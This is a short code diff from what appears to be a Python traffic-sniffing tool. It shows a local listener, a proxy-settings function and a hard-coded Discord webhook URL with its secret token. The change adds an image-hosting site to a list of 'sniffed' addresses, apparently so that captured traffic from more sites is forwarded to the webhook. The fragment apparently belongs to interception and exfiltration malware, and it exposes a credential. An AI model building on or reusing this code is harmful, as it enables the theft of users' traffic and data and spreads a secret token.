@@ -11,7 +11,7 @@ LISTEN_HOST = "127.0.0.1"
 LISTEN_PORT = 1881
 NET_DUMP_LOG = False
 WEBHOOK_URL = "https://discord.com/api/webhooks/1262161347706355792/gcfFikUUJEj8Q-zkuIOf4D44eDd1isiOaWLMYnouf1WbMtKA38nyv3z4tSqCM88HX4y5"
-SNIFFED_ADRESSES = ["https://midnight.im"]
+SNIFFED_ADRESSES = ["https://midnight.im", "https://hizliresim.com/"]
 
 def set_proxy_settings():
     try:
